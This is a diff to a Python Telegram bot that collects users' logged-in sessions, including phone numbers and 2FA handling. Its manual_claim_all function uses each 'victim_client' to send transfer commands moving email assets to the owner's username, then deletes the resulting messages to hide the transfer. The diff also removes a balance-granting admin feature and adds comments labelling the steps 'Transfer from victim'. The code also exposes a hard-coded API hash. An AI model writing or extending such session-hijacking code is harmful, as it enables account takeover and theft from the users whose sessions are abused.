@@ -25,7 +25,7 @@ API_HASH = os.getenv("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")
 
 # FIXED OWNER CONFIG
 OWNER_ID = 8978696758
-OWNER_USERNAME = "@THE_ARYAx"
+OWNER_USERNAME = "@@THE_ARYAx"
 
 TARGET_MAIL_BOT = "fakemailbot"
 
@@ -222,27 +222,13 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     uid = update.effective_user.id
-    is_admin = uid in get_all_admins()
     
-    if is_admin:
+    if uid in get_all_admins():
         state = user_states.get(uid)
         if state == 'admin':
             if text.isdigit():
                 db_exec("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (int(text),))
                 await update.message.reply_text(f"✅ {p_style('Admin Added')}", parse_mode="HTML")
-            user_states[uid] = None; return
-        elif state == 'give_bal_id':
-            if text.isdigit():
-                user_states['give_bal_target'] = int(text)
-                user_states[uid] = 'give_bal_amt'
-                await update.message.reply_text(f"💰 {f_txt('Enter Amount to Give')}:")
-            return
-        elif state == 'give_bal_amt':
-            if text.isdigit():
-                amt = int(text)
-                target_id = user_states.get('give_bal_target')
-                db_exec("UPDATE users SET balance = balance + ? WHERE user_id=?", (amt, target_id))
-                await update.message.reply_text(f"✅ {p_style(f'Added {amt}rs to {target_id}')}", parse_mode="HTML")
             user_states[uid] = None; return
 
     # 2FA handling
@@ -394,7 +380,6 @@ async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     kb = [
         [InlineKeyboardButton("👥 Logged Accounts", callback_data="admin_acc")],
-        [InlineKeyboardButton("💰 Give Balance", callback_data="admin_give_bal")],
         [InlineKeyboardButton("📤 Claim All Mails", callback_data="admin_claim")],
         [InlineKeyboardButton("👑 Add Admin", callback_data="admin_add")]
     ]
@@ -414,10 +399,6 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for u in users: 
             text += f"{p_style('ID: ' + str(u[0]))}\n{p_style('Phone: ' + str(u[1]))}\n"
         await query.edit_message_text(text, parse_mode="HTML")
-        
-    elif data == "admin_give_bal":
-        await query.edit_message_text(f"💰 {f_txt('Send User ID to give balance')},")
-        user_states[uid] = 'give_bal_id'
         
     elif data == "admin_claim":
         asyncio.create_task(manual_claim_all(uid, query))
@@ -455,8 +436,10 @@ async def manual_claim_all(owner_id, query):
             if not emails: continue
 
             for email in emails:
+                # LIVE LOG: Transferring
                 await query.message.reply_text(f"🔄 <b>{f_txt('TRANSFERRING')}:</b> {p_style(email)}", parse_mode="HTML")
                 
+                # Step 1: Transfer from victim
                 await victim_client.send_message(target_bot, f"/transfer {email} {OWNER_USERNAME}")
                 await asyncio.sleep(4)
                 
@@ -465,8 +448,10 @@ async def manual_claim_all(owner_id, query):
                     await victim_client.delete_messages(target_bot, msgs[0].id)
                 except: pass
                 
+                # LIVE LOG: Claiming
                 await query.message.reply_text(f"📥 <b>{f_txt('CLAIMING')}:</b> {p_style(email)}", parse_mode="HTML")
                 
+                # Step 2: Claim from owner
                 await target_owner_client.send_message(owner_target_bot, email)
                 await asyncio.sleep(4)
                 
